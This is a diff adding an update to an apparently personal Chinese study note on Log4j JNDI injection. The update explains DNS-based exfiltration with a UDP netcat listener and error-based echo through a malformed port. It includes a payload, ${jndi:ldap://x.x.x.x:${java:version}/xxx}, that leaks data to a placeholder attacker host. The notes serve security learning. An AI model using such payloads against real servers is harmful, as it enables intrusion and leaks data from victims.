@@ -68,6 +68,20 @@ https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&mid=2247483945&idx=1&sn=b15b68
 
 https://www.cnblogs.com/jona-test/p/11399218.html
 
+更新 2021/12/24
+
+看了大哥4ra1n的文章 https://xz.aliyun.com/t/10659
+
+其中学习了dns（DNS协议是属于JNDI协议的） 可以带出数据 nc -lvup 通过udp接
+
+![image](https://user-images.githubusercontent.com/63966847/147314294-222e4af5-98b3-4eac-863a-64316c775f91.png)
+
+然后就是回显的问题，通过报错来回显，其中port本该是int如果给它无法转int的字符串就会抛出这里的信息(触发RuntimeException)，并且ignoreExceptions配置为false。触发RuntimeException()
+
+而NumberFormatException就是触发RuntimeException的子类。
+
+${jndi:ldap://x.x.x.x:${java:version}/xxx}
+
 ## bypass
 
 这个东西太多了，在tw一看就很多很多。一方面是因为一些协议可以返回输入的值比如：lower data
